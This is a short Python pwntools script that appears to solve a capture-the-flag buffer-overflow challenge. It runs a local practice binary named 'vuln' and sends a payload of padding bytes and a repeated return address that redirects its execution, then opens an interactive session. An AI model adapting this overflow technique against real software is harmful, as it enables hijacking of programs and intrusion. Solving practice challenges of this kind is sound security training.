xfrom pwn import *

sock = process("./vuln", cwd="/problems/overflow-1_3_583b6161611ecae1a23f4a8e628e3a47/")
payload = 'A' * 0x44
payload += p32(0x80485e6) * 10
sock.sendline(payload)

sock.interactive()
